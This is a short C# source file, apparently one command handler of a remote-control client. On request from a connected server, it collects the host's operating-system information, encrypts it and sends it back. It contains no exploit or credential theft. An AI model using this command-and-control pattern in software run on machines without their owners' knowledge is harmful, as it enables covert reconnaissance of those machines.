using Client.Core.Networking;
using Client.Core.Security;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;
using System.Threading.Tasks;
using Client.Core.Helper;

namespace Client.Core.Events
{
    class GetOperatingSystem
    {
        public static void Execute(string data)
        {
            if(NetworkManager.IsConnected)
            {
                NetworkManager.Connection.SendObject("GetOperatingSystemRep", Cryptography.Encrypt(SystemInfoHelper.GetOperatingSystem()));
            }
            else
            {
                //TODO, Buffer / Packet queue of some sort
            }
        }
    }
}
